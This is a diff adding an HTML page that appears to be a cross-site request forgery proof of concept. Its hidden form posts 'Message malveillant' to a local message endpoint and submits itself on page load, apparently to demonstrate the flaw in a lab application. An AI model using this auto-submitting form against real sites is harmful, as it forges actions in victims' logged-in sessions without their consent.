@@ -1,0 +1,10 @@
+<html>
+<body>
+    <form id="hiddenForm" action="http://localhost:8080/message" method="POST">
+        <input type="hidden" name="content" value="Message malveillant" />
+    </form>
+    <script>
+        document.getElementById('hiddenForm').submit();  // Soumettre le formulaire automatiquement
+    </script>
+</body>
+</html>
